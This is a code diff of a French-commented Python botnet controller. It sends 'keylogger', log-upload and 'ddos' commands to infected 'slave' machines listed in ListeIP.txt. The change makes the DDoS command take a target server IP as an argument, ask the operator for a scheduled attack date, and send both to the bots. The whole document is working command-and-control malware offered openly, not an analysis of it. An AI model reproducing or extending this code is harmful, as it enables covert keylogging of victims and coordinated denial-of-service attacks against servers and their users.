@@ -11,7 +11,7 @@ lock = threading.Lock()
 
 class Connexion():
     # création de l'objet connexion avec le champ adresseMachine.
-    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, listeIP, port, fichier, chemin):
+    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, listeIP, port, fichier, chemin, ip, date):
         self.adresseMachine = adresseMachine
         self.carteReseauEcoute = carteReseauEcoute
         self.carteReseauConn = carteReseauConn
@@ -19,6 +19,8 @@ class Connexion():
         self.port = port
         self.fichier = fichier
         self.chemin = chemin
+        self.ip = ip
+        self.date = date
 
     #1er étape, mettre en place un canal de communication pour recevoir les messages du slave
     def listen(self, carteReseauEcoute, port, fichier):
@@ -76,10 +78,14 @@ class ChoixAction(Connexion):
         carteReseauConn.send("keylogger".encode("utf-8"))
         #reçois directement sa réponse
 
-    def ddos(self, carteReseauConn):
+    def ddos(self, carteReseauConn, ip, date):
         #idem
         print("Choix d'attaque : DDoS. Signal envoyé")
         carteReseauConn.send("ddos".encode("utf-8"))
+        date = input("A quelle date voulez vous lancer l'attaque format(yyyy-mm-jj hh:mm): ")
+        carteReseauConn.send(date.encode("utf-8"))
+        carteReseauConn.send(ip.encode("utf-8"))
+
     
     def stop_log(self, carteReseauConn):
         #idem
@@ -87,8 +93,6 @@ class ChoixAction(Connexion):
         carteReseauConn.send("stop".encode("utf-8"))
         carteReseauConn.send("FIN".encode("utf-8"))
 
-        print(carteReseauConn.recv(1024).decode("utf-8"))
-    
     def get_log(self, carteReseauConn, chemin):
         #idem
         print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
@@ -110,12 +114,14 @@ class ChoixAction(Connexion):
 fichier = open("ListeIP.txt", "r+")
 listeIP = []
 chemin = ""
+ip= ""
+date = ""
 port = ""
 adresseMachine = ("localhost", 5000)
 carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
 #on assigne l'objet choixAction qui est l'enfant de l'objet Communication à la variable a
-objetChoixAction = ChoixAction(adresseMachine, carteReseauConn, carteReseauEcoute, listeIP, port, fichier, chemin)
+objetChoixAction = ChoixAction(adresseMachine, carteReseauConn, carteReseauEcoute, listeIP, port, fichier, chemin, ip, date)
 
 parser = argparse.ArgumentParser()
 parser.add_argument("--listen", type=int,
@@ -125,7 +131,7 @@ parser.add_argument("--key", type=str,
 parser.add_argument("--upload", type=str,
                      help="upload le fichier du keylogger, il faut entrez le chemin du fichier" )
 parser.add_argument("--ddos", type=str,
-                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre la date et l'heure en format yyyy-mm-jj hh:mm")
+                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre l'ip du serveur a ddos")
 
 args = parser.parse_args()
 
@@ -170,14 +176,14 @@ if args.upload:
         print("Impossible de se connecter il n'y a pas d'IP dans la base de donnée")
 
 if args.ddos:
-    dateHeure = args.ddos
-    print(dateHeure)
+    ip = args.ddos
+    print(ip)
     liste = fichier.read()
     if len(liste) != 0:
         print(liste)
         listeIP = ast.literal_eval(liste)
         objetChoixAction.receive(carteReseauConn ,listeIP)
-        objetChoixAction.get_log(carteReseauConn, chemin)
+        objetChoixAction.ddos(carteReseauConn, ip, date)
     else:
         print("Impossible de se connecter il n'y a pas d'IP dans la base de donnée")
 
